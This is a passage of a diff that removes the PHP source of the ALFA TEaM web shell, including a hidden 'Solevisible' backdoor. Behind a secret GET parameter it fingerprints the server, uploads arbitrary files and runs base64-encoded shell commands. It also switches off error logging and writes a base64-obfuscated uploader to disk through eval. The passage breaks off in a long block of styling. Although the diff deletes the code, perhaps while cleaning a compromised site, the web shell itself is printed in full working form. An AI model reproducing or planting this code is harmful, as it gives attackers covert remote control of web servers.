-		$http .= $post . "\r\n\r\n";
-		fwrite($socket, $http);
-		$contents = "";
-		while (!@feof($socket)) {
-			$contents .= @fgets($socket, 4096);
-		}
-		list($header, $body) = explode("\r\n\r\n", $contents, 2);
-		@fclose($socket);
-		return $body;
-	}else{
-		return "";
-	}
-}
-if(isset($_GET["solevisible"])){
-@error_reporting(E_ALL ^ E_NOTICE);
-echo '<html>';
-echo "<title>Solevisible Hidden Shell</title>";
-echo "<body bgcolor=#000000>";
-echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
-$safe_mode = @ini_get('safe_mode');
-if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
-echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
-echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
-echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
-echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
-echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
-echo"<font color=#7CFC00>Disable functions : </font>";
-$disfun = @ini_get('disable_functions');
-if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
-echo"<font color=red>";
-echo "$disfun";
-echo"</font><br>";
-echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
-echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
-echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
-if(isset($_FILES['file'])){
-if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
-else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
-}
-echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
-<hr><pre>';
-if(isset($_POST['command_solevisible'])){
-if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
-$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
-echo alfaEx($solevisible);
-}
-echo'</pre>
-</body></html>';
-exit;}
-@error_reporting(E_ALL ^ E_NOTICE);
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('magic_quotes_runtime', 0);
-@set_time_limit(0);
-if(function_exists('set_magic_quotes_runtime')){
-@set_magic_quotes_runtime(0);
-}
-foreach($_POST as $key => $value){
-if(is_array($_POST[$key])){
-$i=0;
-foreach($_POST[$key] as $f) {
-$f = trim(str_replace(' ', '+',$f));
-$_POST[$key][$i] = decrypt_post($f);
-$i++;
-}
-}else{
-$value = trim(str_replace(' ', '+',$value));
-$_POST[$key] = decrypt_post($value);
-}
-}
-$default_action = 'FilesMan2';//'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'Windows-1251';
-if(strtolower(substr(PHP_OS,0,3))=="win")
-$GLOBALS['sys']='win';
-else
-$GLOBALS['sys']='unix';
-$GLOBALS['home_cwd'] = @alfaGetCwd();
-$GLOBALS["need_to_update_header"] = "false";
-$GLOBALS['glob_chdir_false'] = false;
-if(isset($_POST['c'])){
-if(!@chdir($_POST['c'])){
-	$GLOBALS['glob_chdir_false'] = true;
-}
-}
-$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
-if($GLOBALS['glob_chdir_false']){
-	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
-}
-if($GLOBALS['sys'] == 'win'){
-$GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
-$GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
-}
-if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
-if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
-define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
-function alfahead(){
-$GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
-$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
-define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
-if(!isset($_POST['ajax'])){
-function Alfa_GetDisable_Function(){
-$disfun = @ini_get('disable_functions');
-$afa = '<span class="header_show_all">All Functions Accessible</span>';
-if(empty($disfun))return($afa);
-$s = explode(',',$disfun);
-$s = array_unique($s);
-$i=0;
-$b=0;
-$func = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
-$black_list = array();
-$allow_list = array();
-foreach($s as $d){
-	$d=trim($d);
-	if(empty($d)||!is_callable($d))continue;
-	if(!function_exists($d)){
-		if(in_array($d,$func)){
-			$dis .= $d." | ";$b++;
-			$black_list[] = $d;
-		}else{
-			$allow_list[] = $d;
-		}
-		$i++;
-	}
-}
-if($i==0)return($afa);
-if($i <= count($func)){
-$all = array_values(array_merge($black_list, $allow_list));
-return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
-}
-return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
-}
-function AlfaNum(){
-$args = func_get_args();
-$alfax = array();
-$find = array();
-for($i=1;$i<=10;$i++){
-$alfax[] = $i;
-}
-foreach($args as $arg){
-$find[] = $arg;
-}
-echo '<script>';
-foreach($alfax as $alfa){
-if(in_array($alfa,$find))
-continue;
-echo 'alfa'.$alfa."_=";
-}
-echo '""</script>';
-}
-if(empty($_POST['charset']))
-$_POST['charset'] = $GLOBALS['default_charset'];
-$freeSpace = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
-$totalSpace = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
-$totalSpace = $totalSpace?$totalSpace:1;
-$on="<span class='header_on'> ON </span>";
-$of="<span class='header_off'> OFF </span>";
-$none="<span class='header_none'> NONE </span>";
-if(function_exists('ssh2_connect'))
-$ssh2=$on;
-else
-$ssh2=$of;
-if(function_exists('curl_version'))
-$curl=$on;
-else
-$curl=$of;
-if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
-$mysql=$on;
-else
-$mysql=$of;
-if(function_exists('mssql_connect'))
-$mssql=$on;
-else
-$mssql=$of;
-if(function_exists('pg_connect'))
-$pg=$on;
-else
-$pg=$of;
-if(function_exists('oci_connect'))
-$or=$on;
-else
-$or=$of;
-if(@ini_get('disable_functions'))
-$disfun=@ini_get('disable_functions');
-else
-$disfun="All Functions Enable";
-if(@ini_get('safe_mode'))
-$safe_modes="<span class='header_off'>ON</span>";
-else
-$safe_modes="<span class='header_on'>OFF</span>";
-$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
-if(@ini_get('open_basedir')){
-$basedir_data = @ini_get('open_basedir');
-if(strlen($basedir_data)>120){
-$open_b=substr($basedir_data,0, 120)."...";
-}else{
-$open_b = $basedir_data;
-}
-}else{$open_b=$none;}
-if(@ini_get('safe_mode_exec_dir'))
-$safe_exe=@ini_get('safe_mode_exec_dir');
-else
-$safe_exe=$none;
-if(@ini_get('safe_mode_include_dir'))
-$safe_include=@ini_get('safe_mode_include_dir');
-else
-$safe_include=$none;
-if(!function_exists('posix_getegid'))
-{
-$user = function_exists("get_current_user")?@get_current_user():"????";
-$uid = function_exists("getmyuid")?@getmyuid():"????";
-$gid = function_exists("getmygid")?@getmygid():"????";
-$group = "?";
-}else{
-$uid = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
-$gid = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
-$user = $uid['name'];
-$uid = $uid['uid'];
-$group = $gid['name'];
-$gid = $gid['gid'];
-}
-$cwd_links = '';
-$path = explode("/", $GLOBALS['cwd']);
-$n=count($path);
-for($i=0; $i<$n-1; $i++) {
-$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
-$cach_cwd_path = "";
-for($j=0; $j<=$i; $j++){
-$cwd_links .= $path[$j].'/';
-$cach_cwd_path .= $path[$j].'/';
-}
-$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
-}
-$drives = "";
-foreach(range('a','z') as $drive)
-if(@is_dir($drive.':\\'))
-$drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
-$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
-echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
-<link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
-<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
-<style type="text/css">';?>
-.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.alfateam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.alfa-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 